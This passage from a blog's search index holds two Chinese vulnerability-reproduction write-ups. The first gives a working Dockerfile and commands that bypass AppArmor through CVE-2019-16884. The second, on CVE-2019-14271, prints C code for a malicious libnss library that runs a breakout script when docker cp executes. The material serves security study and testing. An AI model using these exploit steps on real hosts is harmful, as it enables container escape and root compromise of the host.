<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>容器逃逸之AppArmor绕过-CVE-2019-16884复现</title>
      <link href="//p/2023/CVE-2019-16884/"/>
      <url>//p/2023/CVE-2019-16884/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>环境部署 (X)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2019-16884</span><br></pre></td></tr></table></figure><p>不过有个坑，这里自动搭建的 runc 版本有点问题，见 <a href="https://github.com/Metarget/metarget/issues/89">issue89</a></p><p>这里使用 ssst0n3 大佬的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker network create <span class="built_in">test</span></span><br><span class="line">docker run --network=<span class="built_in">test</span> -d -p 2222:22 ssst0n3/docker_archive:ubuntu-20.04_docker-ce-19.03.2_docker-ce-cli-19.03.2_containerd.io-1.2.6-3_runc-1.0.0-rc8</span><br><span class="line">ssh -p 2222 root@127.0.0.1</span><br></pre></td></tr></table></figure><p>一定要创建网络噢，否则SSH连不上去</p><p>漏洞影响版本</p><ul><li>runC &lt;= 1.0.0-rc8 (Docker &lt; 19.03.1)</li></ul><p>漏洞与 AppArmor 有关</p><p>漏洞描述</p><blockquote><p>在容器镜像中可以声明一个VOLUME, 挂载至/proc, 欺骗runc使其认为AppArmor已经成功应用，从而绕过AppArmor策略。</p></blockquote><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p>相信不少同学在Centos搭建环境被 SELinux 坑过不少，AppArmor 作为 SELinux 代替品出现，是一个Linux内核安全模块，允许系统管理员通过每个程序的配置文件限制程序的功能，上手和易用性比SELinux友好太多。</p><p>该模块可以从宿主机中设置相应的规则，限制容器内的文件能不能从容器内被读写执行，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/apparmor/parameters/enabled <span class="comment"># 查看是否开启apparmor，返回为Y表示开启</span></span><br><span class="line">cat /sys/kernel/security/apparmor/profiles  <span class="comment"># 查看加载的配置文件</span></span><br></pre></td></tr></table></figure><p>Docker 在 Linux 中也是通过查看 <code>/sys/module/apparmor/parameters/enabled</code> 判断<a href="https://github.com/moby/moby/blob/master/daemon/apparmor_default.go#L21">宿主机</a>是否开启 AppArmor，如不开启则开启Docker<a href="https://github.com/moby/moby/blob/master/profiles/apparmor/template.go">默认AppArmor策略</a>。具体runC在启动容器时会尝试<a href="https://github.com/opencontainers/runc/blob/8bf216728cd558d736eda2dff404b34b262b8c77/libcontainer/standard_init_linux.go#L115-L117">加载AppArmor策略</a>：将 <code>exec+AppArmor策略文件路径</code>写入 <code>/proc/self/attr/exec</code>，<a href="https://github.com/opencontainers/runc/blob/8bf216728cd558d736eda2dff404b34b262b8c77/libcontainer/apparmor/apparmor.go#L23-L56">可参考源码</a>，后面<code>/proc/&lt;pid&gt;/attr</code>会在使用主要的安全模块时使用到。</p><p><a href="https://www.kernel.org/doc/html/latest/admin-guide/LSM/index.html">https://www.kernel.org/doc/html/latest/admin-guide/LSM/index.html</a></p><blockquote><p>Process attributes associated with “major” security modules should be accessed and maintained using the special files in /proc/…/attr. A security module may maintain a module specific subdirectory there, named after the module. /proc/…/attr/smack is provided by the Smack security module and contains all its special files. The files directly in /proc/…/attr remain as legacy interfaces for modules that provide subdirectories.</p></blockquote><p>修改<code>/proc/self/attr/exec</code>内容，可以在exec时修改限制策略。 <a href="https://gitlab.com/apparmor/apparmor/-/wikis/AppArmorinterfaces#procselfattrexec">https://gitlab.com/apparmor/apparmor/-/wikis/AppArmorinterfaces#procselfattrexec</a></p><blockquote><p>The /proc/self/attr/exec file can be written to change the tasks confinement at exec time. It is used to perform the change_onexec operation.</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2019-16884 可以使得用户绕过AppArmor的一些策略进而可以实现一些越权操作，上面提到 docker 加载 AppArmor 是通过写入 <code>/proc/self/attr/exec</code> 实现的，我们可以通过挂在 <code>/proc</code> 卷让 runC 误认为它已成功加载 AppArmor 策略。</p><p>不过 runc 在挂载时 <code>checkMountDestination</code> 方法有对 <code>/proc</code> 进行黑名单校验</p><p><a href="https://github.com/opencontainers/runc/blob/7507c64ff675606c5ff96b0dd8889a60c589f14d/libcontainer/rootfs_linux.go#L414-L419">https://github.com/opencontainers/runc/blob/7507c64ff675606c5ff96b0dd8889a60c589f14d/libcontainer/rootfs_linux.go#L414-L419</a></p><p><a href="https://github.com/opencontainers/runc/blob/7507c64ff675606c5ff96b0dd8889a60c589f14d/libcontainer/rootfs_linux.go#L467-L501">https://github.com/opencontainers/runc/blob/7507c64ff675606c5ff96b0dd8889a60c589f14d/libcontainer/rootfs_linux.go#L467-L501</a></p><p>第2个链接如下代码判断存在逻辑问题</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, invalid := <span class="keyword">range</span> invalidDestinations &#123;</span><br><span class="line">path, err := filepath.Rel(filepath.Join(rootfs, invalid), dest)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> path != <span class="string">&quot;.&quot;</span> &amp;&amp; !strings.HasPrefix(path, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%q cannot be mounted because it is located inside %q&quot;</span>, dest, invalid)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经调试，<code>rootfs</code> 和 <code>dest</code> 依次为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rootfs: /var/lib/docker/overlay2/059ee72cfdfb48906c8cee6d34eaea3dbe912a31320cbb749ff5dc39347385de/merged</span><br><span class="line">dest: /var/lib/docker/overlay2/059ee72cfdfb48906c8cee6d34eaea3dbe912a31320cbb749ff5dc39347385de/merged/proc</span><br></pre></td></tr></table></figure><p><a href="https://go.dev/play/p/-kUMChatabH">https://go.dev/play/p/-kUMChatabH</a> </p><p>输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">. &lt;<span class="literal">nil</span>&gt;</span><br><span class="line"></span><br><span class="line">Program exited.</span><br></pre></td></tr></table></figure><p>也就是说黑名单没有起作用！缺少了个 <code>path==&quot;.&quot;</code> 的判断，如有正确判断，<code>checkMountDestination</code> 方法会返回异常</p><p>调用链为</p><p>libcontainer.Init() -&gt; prepareRootfs() -&gt; mountToRootfs() -&gt; checkMountDestination()</p><p> –&gt; apparmor.ApplyProfile(l.config.AppArmorProfile)</p><p>可以注意到，应用 AppArmor 在挂载 rootfs 之后，Debug 一下确实是如此。前面我们知道 AppArmor 通过写入  <code>/proc/self/attr/exec</code> 去写入 AppArmor 规则的，那按理说，我们在先伪造 <code>/proc</code> 目录，然后 AppArmor 还是可以正常写入 <code>/proc/self/attr/exec</code> 才对？因为我一开始是想着 AppArmor 先写入，然后被我们伪造的 <code>/proc</code> 路径给覆盖了。既然能正常写入 <code>/proc/self/attr/exe</code> 那为啥还能bypass apparmor呢？</p><p>这边调试一下，确保 AppArmor 文件确实写进去了，</p><p><img src="/img/CVE-2019-16884/image-20220510103725891.png" class="lazyload" data-srcset="/img/CVE-2019-16884/image-20220510103725891.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220510103725891"></p><p>执行一下 ls 命令是为了确定是否进入到容器里面了</p><p><img src="/img/CVE-2019-16884/image-20220510103835984.png" class="lazyload" data-srcset="/img/CVE-2019-16884/image-20220510103835984.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220510103835984"></p><p>获取 <code>/proc/self/attr/exec</code> 内容确实写入了，但为啥 <code>/flag</code> 还是能正常读取？</p><p>因为写入 runc 产生的 <code>procfs</code> 因为他的 procfs 是容器的，每个进程运行时才能看到他们进程自己专属的 /proc/self 目录，自己伪造的是一个真实的文件系统 没有这种特性</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>ssh 登陆至容器，注意不能 docker exec 进入，因为这个镜像里面通过 qemu 模拟了一个镜像，这个镜像才是漏洞环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@cloud_shoot ~# ssh -p 2222 root@127.0.0.1</span><br><span class="line">root@127.0.0.1&#x27;s password:root</span><br></pre></td></tr></table></figure><p>创建apparmor规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /etc/apparmor.d/no_flag &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">#include &lt;tunables/global&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">profile no_flag flags=(attach_disconnected,mediate_deleted) &#123;</span></span><br><span class="line"><span class="string">  #include &lt;abstractions/base&gt;</span></span><br><span class="line"><span class="string">  file,</span></span><br><span class="line"><span class="string">  deny /flag r,</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p>应用规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/apparmor_parser --replace --write-cache /etc/apparmor.d/no_flag</span><br></pre></td></tr></table></figure><p>随便建个 flag 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;flag&#123;123-123&#125;&quot;</span> &gt; /tmp/flag</span><br></pre></td></tr></table></figure><p>启动一个正常镜像，无权限读取/flag内容</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm --security-opt <span class="string">&quot;apparmor=no_flag&quot;</span> -v /tmp/flag:/flag busybox cat /flag</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2019-16884/image-20220506091501130.png" class="lazyload" data-srcset="/img/CVE-2019-16884/image-20220506091501130.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220506091501130"></p><p>创建一个恶意镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mkdir apparmor-bypass/ &amp;&amp; <span class="built_in">cd</span> apparmor-bypass/</span><br><span class="line">mkdir -p rootfs/proc/self/&#123;attr,fd&#125;</span><br><span class="line">touch rootfs/proc/self/&#123;status,attr/<span class="built_in">exec</span>&#125;</span><br><span class="line">touch rootfs/proc/self/fd/&#123;4,5&#125;</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;<span class="string">EOF &gt; Dockerfile</span></span><br><span class="line"><span class="string">FROM busybox</span></span><br><span class="line"><span class="string">ADD rootfs /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">VOLUME /proc</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">docker build -t apparmor-bypass .</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --rm --security-opt <span class="string">&quot;apparmor=no_flag&quot;</span> -v /tmp/flag:/flag apparmor-bypass cat /flag</span><br></pre></td></tr></table></figure><p><img src="/img/CVE-2019-16884/image-20220506091952558.png" class="lazyload" data-srcset="/img/CVE-2019-16884/image-20220506091952558.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220506091952558"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/opencontainers/runc/compare/7507c64ff675606c5ff96b0dd8889a60c589f14d...v1.0.0-rc9">https://github.com/opencontainers/runc/compare/7507c64ff675606c5ff96b0dd8889a60c589f14d...v1.0.0-rc9</a></p><p>在执行mount操作前，检查目的路径是否为/proc或位于/proc下, 如果是，则必须为<code>procfs</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> path == <span class="string">&quot;.&quot;</span> &#123;</span><br><span class="line">    <span class="comment">// an empty source is pasted on restore</span></span><br><span class="line">    <span class="keyword">if</span> source == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// only allow a mount on-top of proc if it&#x27;s source is &quot;proc&quot;</span></span><br><span class="line">    isproc, err := isProc(source)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// pass if the mount is happening on top of /proc and the source of</span></span><br><span class="line">    <span class="comment">// the mount is a proc filesystem</span></span><br><span class="line">    <span class="keyword">if</span> isproc &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%q cannot be mounted because it is not of type proc&quot;</span>, dest)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>关于断点调试点一些小坑</p><p>因为 docekr 的各个组件的调用顺序是 docker run -&gt; dockerd -&gt; containerd -&gt; containerd-shim -&gt; runc ，因为 runc 是 cli 来的，我们并不知道入参是什么，这里用了个笨方法，依次拉 docker cli、dockerd、containerd 和 runc 的代码下来，然后 docker cli -&gt; dockerd 是 HTTP REST 请求，dockers -&gt;  containerd 是 gRPC 请求，经 debug 发现 dockerd 通过 containerd 依赖的 client 去 gRPC调用。然后调用 containers-shim 以及 containers-shim 调 runc 通过系统命令调用，一开始在 moby 库找了很多 runc 代码发现没有 rootfs.go 这个文件，原来是 moby 并没有直接依赖 runc 的这部分代码。</p><p>各个版本</p><ul><li>docker-ce-19.03.2 </li><li>docker-ce-cli-19.03.2</li><li>containerd.io-1.2.6-3</li><li>runc-1.0.0-rc8<ul><li>注意低版本编译默认没有开启 apparmor 选项，<code>-tags &quot;seccomp apparmor&quot;</code></li><li><code>seccomp</code> 选项需要安装依赖 <code>apt install pkg-config</code></li><li><code>apt install libseccomp-dev</code></li></ul></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/265343">https://www.anquanke.com/post/id/265343</a></p><p><a href="https://mp.weixin.qq.com/s/snd1mrEeFheEPB_wrPv8XA">https://mp.weixin.qq.com/s/snd1mrEeFheEPB_wrPv8XA</a></p><p><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E5%AE%89%E5%85%A8%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/linux%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/LSM/apparmor/docker%E4%B8%ADapparmor%E7%9A%84%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.html">https://ssst0n3.github.io/post/网络安全/安全研究/容器安全/进程容器/服务器容器/docker/docker安全的关键技术/linux内核安全机制/LSM/apparmor/docker中apparmor的加载过程.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
          <category> 容器逃逸 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 容器逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moby容器逃逸-CVE-2019-14271复现</title>
      <link href="//p/2023/CVE-2019-14271/"/>
      <url>//p/2023/CVE-2019-14271/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>环境部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2019-14271</span><br></pre></td></tr></table></figure><p>漏洞影响版本</p><ul><li>Docker &lt; 19.03.1</li></ul><p>拉一个 alpine 镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull alpine</span><br><span class="line">docker run -itd --name=14271 alpine /bin/sh</span><br></pre></td></tr></table></figure><p>这里如果用 ubuntu 镜像会出现问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: error processing tar file: docker-tar: relocation error: /lib/x86_64-linux-gnu/libnss_files.so.2: symbol __libc_readline_unlocked version GLIBC_PRIVATE not defined <span class="keyword">in</span> file libc.so.6 with link time reference</span><br><span class="line">: <span class="built_in">exit</span> status 127</span><br></pre></td></tr></table></figure><p>不过后面利用的时候好像 ubuntu 镜像又好了，很神奇…</p><p>漏洞描述</p><blockquote><p>The vulnerability can be exploited, provided that a container has been compromised by a previous attack (e.g. through any other vulnerability, leaked secrets, etc.), or when a user runs a malicious container image from an untrusted source (registry or other). If the user then executes the vulnerable cp command to copy files out of the compromised container, the attacker can escape and take full root control of the host and all other containers in it.</p></blockquote><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><code>docker cp</code> 命令是用来在容器和宿主机之间拷贝文件的，比如把容器中的 <code>/var/logs</code> 目录拷贝到本机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp container_name:/var/logs /some/host/path</span><br></pre></td></tr></table></figure><p>这里在容器内通过 <code>dd</code> 在 <code>/var/log</code> 新建了个大文件，以便于捕捉复制文件时的进程。如下，当我们执行 <code>docker cp</code> 时，通过 ps 看到运行了一个 <code>docker-tar</code> 的进程从容器内打包文件</p><p><img src="/img/moby-container-escape/image-20220423223340004.png" class="lazyload" data-srcset="/img/moby-container-escape/image-20220423223340004.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220423223340004"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp 14271:/var/log log &amp;</span><br><span class="line">ps afx | grep -v grep | grep -B 1 docker-tar</span><br><span class="line">ls -l /proc/[docker-tar-pid]/root</span><br></pre></td></tr></table></figure><p><code>/var/lib/docker/overlay2/3f5442ab960e56e8e34cfda288b5ec4d313b51b53319e4671a8d8add0c397369/merged/</code> 为容器文件系统根目录，<code>var/log</code> 即为日志目录</p><p><img src="/img/moby-container-escape/image-20220423223643153.png" class="lazyload" data-srcset="/img/moby-container-escape/image-20220423223643153.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220423223643153"></p><p>通过查看进程的根目录发现 <code>ls -l /proc/29989/root</code> ，执行 <code>docker-tar</code> 时会 chroot 至容器目录，因为这可以避免一些恶意软链接文件至宿主问题。尽管 chroot 至容器可以避免恶意软链接，但通过CVE-2019-14271 仍可进行逃逸</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Docker主要是通过Go编写，存在 漏洞Docker版本通过Go 1.11 编译，这个版本一些包含嵌入式C代码（cgo）会在运行时动态加载共享库。<code>docker-tar</code> 使用了 <a href="https://github.com/docker/docker-ce/blob/01e00f054b/components/engine/pkg/chrootarchive/archive.go">net 和 os/user</a> 包，它们在运行时都会加载 <code>libnss_*.so</code>  动态链接库，本来是没有问题的，因为是加载宿主机上的 <code>.so</code> ，但打包容器内的文件时，会通过 chroot 进入容器内，导致加载了容器内的 <code>.so</code>，但容器内的 <code>.so</code> 是可被篡改的，而运行打包命令是宿主机环境，从而导致逃逸。</p><p><code>docker-tar</code> 调用栈</p><p><a href="https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/init_unix.go#L17">https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/init_unix.go#L17</a></p><p><a href="https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/archive_unix.go#L178">https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/archive_unix.go#L178</a></p><p><a href="https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/archive_unix.go#L135">https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/archive_unix.go#L135</a></p><p><a href="https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/chroot_linux.go#L105">https://github.com/docker/docker-ce/blob/v19.03.0/components/engine/pkg/chrootarchive/chroot_linux.go#L105</a></p><p>经分析我们需要构造一个恶意的 <code>.so</code>库，用于加载我们的恶意代码。报错信息写的是加载 <code>libnss_files.so.2</code> 那我们就改这库的源码。<a href="https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html">查阅文档</a>得知可通过构造方法让进程在加载动态链接库时先初始化构造函数，也就是说 <code>docker-tar</code> 执行时会动态加载我们的恶意库中的恶意函数，简化后的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIGINAL_LIBNSS <span class="meta-string">&quot;/original_libnss_files.so.2&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIBNSS_PATH <span class="meta-string">&quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">run_at_link</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> * argv_break[<span class="number">2</span>];</span><br><span class="line">     <span class="keyword">if</span> (!is_priviliged())</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);</span><br><span class="line">     <span class="built_in">fprintf</span>(log_fp, <span class="string">&quot;switched back to the original libnss_file.so&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// success return 0</span></span><br><span class="line">     <span class="keyword">if</span> (!fork())</span><br><span class="line">     &#123;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Child runs breakout</span></span><br><span class="line">           argv_break[<span class="number">0</span>] = strdup(<span class="string">&quot;/breakout&quot;</span>);</span><br><span class="line">           argv_break[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">           execve(<span class="string">&quot;/breakout&quot;</span>, argv_break, <span class="literal">NULL</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">           wait(<span class="literal">NULL</span>); <span class="comment">// Wait for child</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     FILE * proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (proc_file != <span class="literal">NULL</span>)</span><br><span class="line">     &#123;</span><br><span class="line">           fclose(proc_file);</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// can open so /proc exists, not privileged</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we&#x27;re running in the context of docker-tar</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数通过检测 <code>/proc</code> 目录是否为空来判断自己是否运行在 <code>docker-tar</code> 上下文中，如为空则是运行在 <code>docker-tar</code> 上下文中，如非空则为其他正常的容器进程加载这个动态链接库，因为 <code>/proc</code> 上的procfs挂载只存在于容器挂载上下文中。</p><p>如果是通过 <code>docker-tar</code> 调用的此库，先把恶意库恢复为原来的，防止其他进程再一次出发我们的脚本，其中 <code>/breakout</code> 是我们要运行的shell脚本，方便我们改要运行的命令</p><p>据说漏洞发现是由一个外国老哥遇到一个docker cp 复制文件问题引起的<a href="https://github.com/moby/moby/issues/39449">https://github.com/moby/moby/issues/39449</a> 